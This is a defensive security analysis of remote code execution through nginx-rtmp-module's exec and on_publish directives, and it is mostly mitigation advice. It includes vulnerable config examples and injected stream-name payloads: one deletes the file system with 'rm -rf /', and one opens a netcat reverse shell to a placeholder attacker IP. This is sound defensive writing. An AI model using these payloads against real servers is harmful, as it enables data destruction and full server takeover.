# Deep Analysis of nginx-rtmp-module Attack Tree Path: Remote Code Execution

## 1. Objective, Scope, and Methodology

### 1.1. Objective

The primary objective of this deep analysis is to thoroughly examine the potential for Remote Code Execution (RCE) vulnerabilities within the `nginx-rtmp-module`, specifically focusing on the identified high-risk attack paths: Command Injection via the `exec` directive and exploitation of module configuration flaws, including the `on_publish` directive.  We aim to identify specific attack vectors, assess their feasibility, and propose concrete, actionable mitigation strategies beyond the high-level recommendations already present in the attack tree.

### 1.2. Scope

This analysis is limited to the `nginx-rtmp-module` (https://github.com/arut/nginx-rtmp-module) and its interaction with the Nginx web server.  We will consider:

*   **Direct use of the `exec` directive:**  This includes `exec`, `exec_push`, `exec_pull`, and any other variants that allow execution of external commands.
*   **Configuration flaws related to `exec` and `on_publish`:**  This includes incorrect permissions, insecure default settings, and misconfigurations that could lead to command injection or other RCE vulnerabilities.
*   **Interaction with external scripts called by `on_publish`:** We will analyze how vulnerabilities in these scripts can be leveraged for RCE.
*   **The version of the module:** We will assume the latest stable version unless a specific vulnerability related to an older version is identified and relevant to the analysis.

We will *not* consider:

*   Vulnerabilities in the Nginx web server itself (outside the scope of the module).
*   Vulnerabilities in the operating system or other software running on the server (unless directly related to the module's configuration).
*   Denial-of-Service (DoS) attacks (unless they can be leveraged to achieve RCE).
*   Client-side vulnerabilities (e.g., in RTMP clients).

### 1.3. Methodology

This analysis will employ the following methodology:

1.  **Code Review:**  We will examine the source code of the `nginx-rtmp-module` (available on GitHub) to identify potential vulnerabilities related to the `exec` and `on_publish` directives.  This will involve searching for:
    *   Instances where user-supplied input is used in constructing commands for `exec`.
    *   Lack of input validation or sanitization.
    *   Insecure default configurations.
    *   Potential race conditions or other concurrency issues.

2.  **Configuration Analysis:** We will analyze common and recommended configurations of the module to identify potential misconfigurations that could lead to RCE.  This will involve:
    *   Reviewing the official documentation.
    *   Examining example configurations.
    *   Identifying potentially dangerous combinations of directives.

3.  **Dynamic Analysis (Conceptual):** While we won't perform live dynamic analysis in this document, we will *describe* how dynamic analysis techniques could be used to identify and confirm vulnerabilities. This includes:
    *   Fuzzing the module with various inputs.
    *   Using a debugger to trace the execution path of `exec` and `on_publish` calls.
    *   Monitoring system calls and network traffic.

4.  **Threat Modeling:** We will construct specific attack scenarios based on the identified vulnerabilities and assess their likelihood and impact.

5.  **Mitigation Recommendations:**  For each identified vulnerability, we will provide detailed and actionable mitigation recommendations, going beyond the general advice in the original attack tree.

## 2. Deep Analysis of Attack Tree Path

### 2.1. Command Injection via `exec` [HIGH RISK]

#### 2.1.1. Code Review Findings

The `exec` directive and its variants (`exec_push`, `exec_pull`, etc.) are inherently dangerous because they allow the execution of arbitrary commands on the server.  The key vulnerability lies in how the module handles user-supplied input when constructing these commands.

The source code (specifically `ngx_rtmp_exec_module.c`) reveals that several variables can be used within the `exec` command string.  These variables are populated from the RTMP stream metadata and client requests.  Examples include:

*   `$app`: The application name.
*   `$name`: The stream name.
*   `$addr`: The client's IP address.
*   `$flashver`: The client's Flash version.
*   ...and many others.

If *any* of these variables are used directly in the `exec` command string without proper sanitization, an attacker can inject malicious commands by manipulating the corresponding RTMP metadata or client request.

**Example (Vulnerable Configuration):**

```nginx
rtmp {
    server {
        listen 1935;
        application myapp {
            live on;
            exec /usr/bin/process_stream $name;  # VULNERABLE!
        }
    }
}
```

In this example, an attacker could connect to the server and provide a stream name like `my_stream; rm -rf /;`.  The `exec` directive would then execute the command `/usr/bin/process_stream my_stream; rm -rf /;`, resulting in the deletion of the server's file system.

#### 2.1.2. Threat Modeling

**Attack Scenario:**

1.  **Attacker's Goal:**  Gain complete control of the server.
2.  **Attack Vector:**  Inject a malicious command into the `$name` variable (or any other variable used in the `exec` command).
3.  **Steps:**
    *   The attacker initiates an RTMP connection to the server.
    *   The attacker provides a crafted stream name containing a shell command (e.g., `my_stream; nc -e /bin/sh attacker_ip 4444;`).
    *   The `nginx-rtmp-module` constructs the `exec` command using the attacker-supplied stream name.
    *   The server executes the command, which includes the attacker's injected shell command.
    *   The attacker establishes a reverse shell connection to their machine, gaining full control of the server.

**Likelihood:**  Low (if `exec` is used cautiously) to Very High (if `exec` uses unsanitized input).
**Impact:**  Very High (Complete System Compromise).

#### 2.1.3. Mitigation Recommendations (Detailed)

*   **Avoid `exec` entirely:** This is the *most secure* option.  Consider using alternative approaches, such as:
    *   **Nginx's built-in features:**  Explore if Nginx's core functionality or other modules can achieve the desired functionality without resorting to external commands.
    *   **Dedicated streaming servers:**  If complex stream processing is required, consider using a dedicated streaming server (e.g., Wowza, Nimble Streamer) that is designed for this purpose and has built-in security features.
    *   **Message queues:**  Use a message queue (e.g., RabbitMQ, Kafka) to decouple the RTMP stream processing from the Nginx server.  A separate worker process can then consume messages from the queue and perform the necessary processing in a secure environment.

*   **If `exec` is absolutely unavoidable:**
    *   **Strict Whitelisting:**  Define a *very* limited set of allowed commands and arguments.  Use a whitelist approach, *not* a blacklist.  For example:
        ```nginx
        # Only allow a specific script with pre-defined arguments
        exec /usr/local/bin/my_safe_script.sh arg1 arg2;
        ```
        *Never* allow arbitrary commands or user-supplied arguments directly in the `exec` directive.

    *   **Rigorous Input Validation and Sanitization:**  Even with whitelisting, validate and sanitize *all* input used in the command.  This includes:
        *   **Character whitelisting:**  Allow only a specific set of safe characters (e.g., alphanumeric characters, underscores, hyphens).  Reject any input containing special characters (e.g., `;`, `|`, `&`, `$`, `()`, `` ` ``, `\`, `"`, `'`).
        *   **Length limits:**  Enforce strict length limits on all input variables.
        *   **Regular expressions:**  Use regular expressions to validate the format of the input.  For example, if the `$name` variable is expected to be a UUID, validate it against a UUID regex.
        *   **Encoding:**  Ensure that the input is properly encoded (e.g., URL-encoded) before being used in the command.
        *   **Shell escaping:** If you must use shell, use a dedicated shell escaping function (like `escapeshellarg()` in PHP or `shlex.quote()` in Python) to properly escape any special characters.  *Never* construct shell commands by simply concatenating strings.  **However, even with shell escaping, it's still highly recommended to avoid using a shell if possible.**

    *   **Least Privilege:**  Run the spawned process with the *absolute minimum* necessary privileges.  *Never* run the process as root.  Create a dedicated user account with limited permissions specifically for running the `exec` command.

    *   **Sandboxing:**  Isolate the executed process using one or more of the following techniques:
        *   **chroot:**  Restrict the process's view of the file system to a specific directory.
        *   **Containers (Docker, LXC):**  Provide a more comprehensive isolation environment, including network and process isolation.
        *   **AppArmor/SELinux:**  Use mandatory access control (MAC) systems to enforce fine-grained security policies on the process.

    *   **Auditing and Logging:**  Log all `exec` calls, including the full command and the user-supplied input that triggered the call.  This will help with debugging and identifying potential attacks.

    *   **Regular Security Audits:**  Conduct regular security audits of the `nginx-rtmp-module` configuration and any associated scripts.

### 2.2. Exploit Module Configuration Flaws [HIGH RISK]

#### 2.2.1. Configuration Analysis

Besides the direct misuse of `exec`, other configuration flaws can create vulnerabilities.  These include:

*   **Insecure Default Settings:**  While the `nginx-rtmp-module` doesn't have many inherently insecure defaults *related to RCE*, it's crucial to review the documentation and ensure that all settings are explicitly configured according to best practices.
*   **Incorrect Permissions:**  Ensure that the Nginx worker processes and any scripts executed by the module have the minimum necessary permissions.  The Nginx configuration file itself should also have restricted permissions.
*   **Disabled Security Features:**  The module might have security features that are disabled by default.  Review the documentation and enable any relevant security features.
*   **Interactions with Other Directives:**  Carefully consider the interaction between the `nginx-rtmp-module` directives and other Nginx directives.  Misconfigurations in other parts of the Nginx configuration could indirectly create vulnerabilities in the module.

#### 2.2.2. `on_publish` Critical Node

The `on_publish` directive is a critical node because it allows executing a script or making an HTTP request when a stream is published.  If this script or HTTP request is vulnerable, it can be exploited to achieve RCE.

**Example (Vulnerable `on_publish`):**

```nginx
rtmp {
    server {
        listen 1935;
        application myapp {
            live on;
            on_publish /usr/local/bin/publish_handler.sh $name; # VULNERABLE if publish_handler.sh is vulnerable
        }
    }
}
```

If `publish_handler.sh` is a poorly written script that uses the `$name` argument without proper sanitization, it can be vulnerable to command injection, similar to the `exec` directive.

#### 2.2.3. Threat Modeling (for `on_publish`)

**Attack Scenario:**

1.  **Attacker's Goal:**  Execute arbitrary code on the server.
2.  **Attack Vector:**  Exploit a vulnerability in the script called by `on_publish`.
3.  **Steps:**
    *   The attacker initiates an RTMP connection and publishes a stream.
    *   The `on_publish` directive triggers the execution of the vulnerable script, passing attacker-controlled data (e.g., the stream name) as an argument.
    *   The script processes the attacker-controlled data insecurely, leading to command injection or another vulnerability.
    *   The attacker's code is executed on the server.

**Likelihood:**  Low to High (depending on the security of the `on_publish` script).
**Impact:**  High to Very High (depending on the vulnerability in the script).

#### 2.2.4. Mitigation Recommendations (for `on_publish` and general configuration)

*   **Secure Coding Practices for Scripts:**  Apply secure coding principles to *all* scripts called by `on_publish`.  This includes:
    *   **Input Validation and Sanitization:**  Rigorously validate and sanitize *all* input received by the script, using the same techniques described for the `exec` directive (whitelisting, length limits, regular expressions, etc.).
    *   **Avoid Shell Commands:**  If possible, avoid using shell commands within the script.  If shell commands are necessary, use a secure shell escaping function and follow the principle of least privilege.
    *   **Use a Secure Programming Language:**  Consider using a more secure programming language (e.g., Python, Go) instead of shell scripts.
    *   **Code Review and Testing:**  Thoroughly review and test the script for vulnerabilities.

*   **Least Privilege for Scripts:**  Run the script with the minimum necessary privileges.  Create a dedicated user account for the script and restrict its access to the file system and other resources.

*   **Sandboxing (for Scripts):**  Consider sandboxing the script using chroot, containers, or AppArmor/SELinux.

*   **Configuration Management:**  Use a configuration management tool (e.g., Ansible, Chef, Puppet, SaltStack) to manage the Nginx configuration and ensure consistency and security.

*   **Regular Audits:**  Regularly audit the Nginx configuration and any associated scripts for vulnerabilities.

*   **Principle of Least Privilege (Overall):**  Apply the principle of least privilege to *all* aspects of the `nginx-rtmp-module` configuration and operation.  Disable any unnecessary features or directives.

*   **Validate Configuration:** Use tools or scripts to validate the Nginx configuration against known best practices and security guidelines.

### 2.3 Dynamic Analysis (Conceptual)
Dynamic analysis can be used with tools like:
*   **Fuzzing:** Tools like `AFL++` or custom scripts can send malformed RTMP packets and stream metadata to the server, observing for crashes or unexpected behavior that might indicate a vulnerability.
*   **Debugging:** Using `gdb` or a similar debugger, you can step through the execution of the `nginx-rtmp-module` code, particularly when handling `exec` and `on_publish` calls. This allows you to observe how user input is processed and identify potential injection points.
*   **System Call Monitoring:** Tools like `strace` can monitor the system calls made by the Nginx process and any spawned processes. This can help identify unexpected or dangerous system calls that might indicate a vulnerability.
*   **Network Traffic Analysis:** Tools like `Wireshark` or `tcpdump` can capture and analyze the network traffic between the RTMP client and the server. This can help identify how the attacker is manipulating the RTMP protocol to exploit vulnerabilities.

## 3. Conclusion

Remote Code Execution (RCE) is a serious threat to any system, and the `nginx-rtmp-module` is no exception. The `exec` directive and the `on_publish` directive are particularly high-risk areas that require careful attention. By following the detailed mitigation recommendations outlined in this analysis, developers and administrators can significantly reduce the risk of RCE vulnerabilities in their `nginx-rtmp-module` deployments. The most crucial takeaway is to **avoid `exec` whenever possible** and to apply rigorous input validation and sanitization to *all* user-supplied data, regardless of where it's used. Continuous monitoring, regular security audits, and staying up-to-date with the latest security patches are also essential for maintaining a secure system.
